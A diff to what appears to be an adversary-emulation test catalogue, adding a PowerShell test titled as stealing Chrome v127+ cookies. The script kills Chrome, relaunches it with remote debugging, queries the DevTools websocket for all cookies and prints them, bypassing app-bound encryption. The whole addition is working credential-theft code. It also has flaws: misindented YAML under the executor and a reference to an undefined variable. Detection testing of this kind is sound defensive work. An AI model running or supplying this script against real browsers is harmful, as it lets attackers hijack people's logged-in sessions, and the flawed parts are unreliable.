@@ -115,3 +115,48 @@ atomic_tests:
     cleanup_command: rm -rf /tmp/WhiteChocolateMacademiaNut
     name: bash
     elevation_required: false
+- name: Steal Chrome v127+ cookies via Remote Debugging (Windows)
+  auto_generated_guid: 
+  description: |-
+    Chrome v127+ uses app-bound encryption to protect cookies. This test bypasses that protection to obtain the cookies. If successful, the test outputs cookie values to the console.
+    Note: Will stop any instances of Chrome already running
+    Adapted from https://embracethered.com/blog/posts/2024/cookie-theft-in-2024-and-what-todo
+  supported_platforms:
+  - windows
+  executor:
+  command: |-
+    $devToolsPort = 9222
+    $testUrl = "https://www.google.com"
+    stop-process -name "chrome" -force -erroraction silentlycontinue
+    $chromeProcess = Start-Process "chrome.exe" "$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default" -PassThru
+    Start-Sleep 10
+    $jsonResponse = Invoke-WebRequest "http://localhost:$devToolsPort/json" -UseBasicParsing
+    $devToolsPages = ConvertFrom-Json $jsonResponse.Content
+    $ws_url = $devToolsPages[0].webSocketDebuggerUrl
+    $ws = New-Object System.Net.WebSockets.ClientWebSocket
+    $uri = New-Object System.Uri($ws_url)
+    $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
+    $GET_ALL_COOKIES_REQUEST = '{"id": 1, "method": "Network.getAllCookies"}'
+    $buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)
+    $segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length
+    $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
+    $completeMessage = New-Object System.Text.StringBuilder
+    do {
+        $receivedBuffer = New-Object byte[] 2048
+        $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length
+        $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result
+        $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)
+        $completeMessage.Append($receivedString)
+    } while (-not $result.EndOfMessage)
+    $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closing", [System.Threading.CancellationToken]::None).Wait()
+    try {
+        $response = ConvertFrom-Json $completeMessage.ToString()
+        $cookies = $response.result.cookies
+    } catch {
+        Write-Host "Error parsing JSON data."
+    }
+    $allCookieCommands = $cookieCommands -join " "
+    Write-Host $cookies
+    Stop-Process $chromeProcess -Force
+  name: powershell
+  elevation_required: false
